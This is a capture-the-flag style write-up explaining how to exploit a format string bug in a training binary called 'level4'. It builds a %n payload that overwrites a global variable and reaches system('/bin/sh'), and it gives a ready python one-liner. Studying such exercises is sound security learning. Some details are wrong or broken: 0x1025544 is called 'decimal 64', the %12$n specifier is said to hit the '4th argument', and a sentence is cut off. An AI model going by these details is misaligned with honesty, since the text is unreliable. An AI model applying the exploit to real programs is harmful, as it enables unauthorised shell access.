# Exploiting a Format String Vulnerability

This exercise involves exploiting a format string vulnerability in the program. The vulnerability arises due to the unsafe use of `printf(buf)` without proper format string sanitization, allowing attackers to manipulate the behavior of the program.

---

### Understanding the Code
1. **Key Observations**:
   - The vulnerable function is `n()`, which reads input into a buffer (`buf`) using `fgets` and then passes it directly to `printf`.
   - The global variable `m` must be set to `0x1025544` to execute the conditional block, which triggers a call to `system("/bin/sh")`.

2. **Buffer Details**:
   - `buf` is a **520-byte buffer** allocated on the stack.
   - The function reduces the stack pointer by **0x218 (536 bytes)**, which accommodates `buf` and any additional local variables or saved registers.
   (the buffer is only 520, but the compare is 0x1025544, it would seam impossible to write this many characters.... unles... :o)
   (yes we can use a pressision flag for printf to write many many zeros)

3. **Global Variable `m`**:
   - The variable `m` is a **global variable** stored at address `0x8049810`.

4. **Vulnerability**:
   - The `printf(buf)` call is unsafe because it directly prints user-controlled input (`buf`). If the input includes format specifiers (e.g., `%n`), it can be exploited to modify memory values.

---

### Exploitation
To exploit this vulnerability, the goal is to:
1. Write the value `0x1025544` to the memory address of `m` (`0x8049810`).
2. Use a **`%0[NUMBER DESIRED OF ZEROS]d` format specifier** to write the number of zeros we want.
3. Use a **`%n` format specifier** to write the number of characters printed so far into the address of `m`.

---

### Exploit Breakdown

#### 1. Memory Layout and Address Calculation:
- The global variable `m` is located at `0x8049810`.
- The exploit needs to write the value `0x1025544` (decimal 64) to this address using the `%n` format string specifier.

#### 2. Input Construction:
- The input to `fgets` will be crafted as:
  - The **address** of `m` (`0x8049810`) as the starting bytes.
  - The `%12$n` format specifier to write to the 4th argument on the stack, which will be the address of `m`.

#### Payload Details:
- **`b"\x10\x98\x04\x08"`**:
  The address of `m`, placed at the beginning of the input.

- **"%0" + str(16930116 - 4) + "d"**:
  Padding with zeros to ensure 0x1025544 characters are printed before reaching `%n`.

- **`b"%12$n"`**:
  The `%12$n` specifier writes the total number of printed characters (0x1025544) to the memory address specified by the 12th argument on the stack (i.e., `0x8049810`).

---

### Execution Steps
1. **Run the Exploit**:
   ```bash
   python -c 'print(b"\x10\x98\x04\x08" + "%0" + str(16930116 - 4) + "d" + "%12$n")' | ./level4
   ```

2. **Expected Outcome**:
   - The global variable `m` is updated to `0x1025544`.
   - The program prints the pass


---

### Summary of Exploit
This exercise demonstrates the use of a **format string attack** to manipulate a global variable.
By carefully crafting the input with an address and `%n` specifier, attackers can exploit unsafe use of `printf` to overwrite memory and gain control of the program.
This type of vulnerability underscores the importance of validating and sanitizing user input to prevent such attacks.